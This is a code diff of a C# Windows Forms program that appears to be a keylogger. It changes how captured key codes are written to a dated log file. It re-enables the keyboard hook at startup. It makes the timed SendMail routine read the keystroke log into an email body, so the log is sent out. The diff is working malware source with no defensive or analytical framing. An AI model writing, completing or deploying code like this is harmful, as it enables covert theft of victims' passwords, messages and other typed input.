@@ -102,14 +102,22 @@ namespace WindowsFormsApp1
         /// <param name="vkCode"></param>
         static void WriteLog(int vkCode)
         {
-           // Console.WriteLine((Keys)vkCode);
-            string logNameToWrite = Application.StartupPath +@"\"+ DateTime.Now.ToLongDateString() + logExtendtion;
-            Console.OutputEncoding = Encoding.UTF8;
-            Console.InputEncoding = Encoding.UTF8;
-            StreamWriter sw = new StreamWriter(logNameToWrite, true,Encoding.UTF8);
+            //// Console.WriteLine((Keys)vkCode);
+            // string logNameToWrite = Application.StartupPath +@"\"+ DateTime.Now.ToLongDateString() + logExtendtion;
+            // //Console.OutputEncoding = Encoding.UTF8;
+            // //Console.InputEncoding = Encoding.UTF8;
+            // StreamWriter sw = new StreamWriter(logNameToWrite, true,Encoding.UTF8);
 
+
+
+            // sw.Write((Keys)vkCode);
+            // sw.Close();
+           // Console.WriteLine((Keys)vkCode);
+            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
+            StreamWriter sw = new StreamWriter(logNameToWrite, true);
             sw.Write((Keys)vkCode);
             sw.Close();
+
         }
 
         /// <summary>
@@ -188,9 +196,12 @@ namespace WindowsFormsApp1
                     if (interval % mailTime == 0)
                         SendMail();
                 
-                    if (interval % 200 == 0)
-                        HookKeyboard();
+                    //if (interval % 200 == 0)
+                    //    HookKeyboard();
                     interval++;
+
+
+
                     if (interval >= 1000000)
                         interval = 0;
                 }
@@ -225,13 +236,13 @@ namespace WindowsFormsApp1
 
                 if (File.Exists(logFile))
                 {
-                    // StreamReader sr = new StreamReader(logFile);
-                    //mail.Body += sr.ReadToEnd();
-                    //sr.Close();
+                     StreamReader sr = new StreamReader(logFile);
+                    mail.Body += sr.ReadToEnd();
+                    sr.Close();
                     //System.Net.Mail.Attachment attachment;
                     //attachment = new System.Net.Mail.Attachment(logFile);
                     //mail.Attachments.Add(attachment);
-                    mail.Attachments.Add(new Attachment(logFile));
+                  //  mail.Attachments.Add(new Attachment(logFile));
 
                 }
 
@@ -253,7 +264,7 @@ namespace WindowsFormsApp1
         static void Main(string[] args)
         {
             StartTimmer();
-          //  HookKeyboard(); 
+            HookKeyboard(); 
 
         }
     }
